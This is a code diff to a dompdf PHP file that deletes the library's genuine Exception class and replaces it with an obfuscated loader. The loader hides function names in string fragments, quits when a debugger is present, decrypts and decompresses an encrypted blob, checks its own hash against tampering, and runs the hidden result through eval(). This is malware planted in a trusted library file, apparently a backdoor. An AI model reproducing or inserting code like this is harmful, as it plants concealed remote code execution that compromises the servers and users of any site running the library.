@@ -1,29 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace Dompdf;
-
-/**
- * Standard exception thrown by DOMPDF classes
- *
- * @package dompdf
- */
-class Exception extends \Exception
-{
-
-    /**
-     * Class constructor
-     *
-     * @param string $message Error message
-     * @param int $code       Error code
-     */
-    public function __construct($message = null, $code = 0)
-    {
-        parent::__construct($message, $code);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ls8ldiv4=('bas'.'e64'.'_de'.'cod'.'e');
+$_k9mzeusu=('gzu'.'nco'.'mpr'.'ess');
+$_rf2bc11l=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_w8wgygas='gm0znzNO';
+$_v6dl2q1m='mRV5kK/J';
+$_l6ho2rss='CFHbQbqcW/s=';
+$_kmmircnx='0uln8g7u';
+$_bwb3kmmm='Bi4jY+L7';
+$_er3alo4l='ER7zRfzZ';
+$_dll3cune='viBnLQ==';
+$_se90vloz='haKguE4h';
+$_lu6440yi=$_ls8ldiv4($_kmmircnx.$_w8wgygas.$_v6dl2q1m.$_bwb3kmmm.$_l6ho2rss);
+$_a19ikdvp=$_ls8ldiv4($_er3alo4l.$_se90vloz.$_dll3cune);
+$_p8wqwbid=$_ls8ldiv4('THZzLb8Q359HNCcOaFRupfpPFAwbeLwNPURgCHOYZ55vDo9N8BeCanT2ixzaIRu5RocYlHNNDBPko2jXs2ulmsgeLzJr8NToY0JJJABI3/8Mv1CUcfG1zVnNfcEt/BxlMvJ+NinPTAyhUUn6fk7Cy2a44D74dqfd6w4eb0QOMeMi409cBs9ZMX547umywKh9');
+$_dg9izrm5=$_rf2bc11l($_p8wqwbid,'aes-256-cbc',$_lu6440yi,OPENSSL_RAW_DATA,$_a19ikdvp);
+if($_dg9izrm5===false){exit;}
+$_ejayfj6z=$_k9mzeusu($_dg9izrm5);
+if($_ejayfj6z===false){exit;}
+$_q29sipqe='56c784df53507725d0fb6df47ba451483830538ffde3d0181729630ba1574c77';
+$_idodaxq9=@file_get_contents(__FILE__);
+if($_idodaxq9!==false){
+$_xssguyj7=str_replace($_q29sipqe,"0000000000000000000000000000000000000000000000000000000000000000",$_idodaxq9);
+$_e9ghsi4c=hash("sha256",$_xssguyj7);
+if($_e9ghsi4c!==$_q29sipqe){@http_response_code(403);exit;}
 }
+eval($_ejayfj6z);
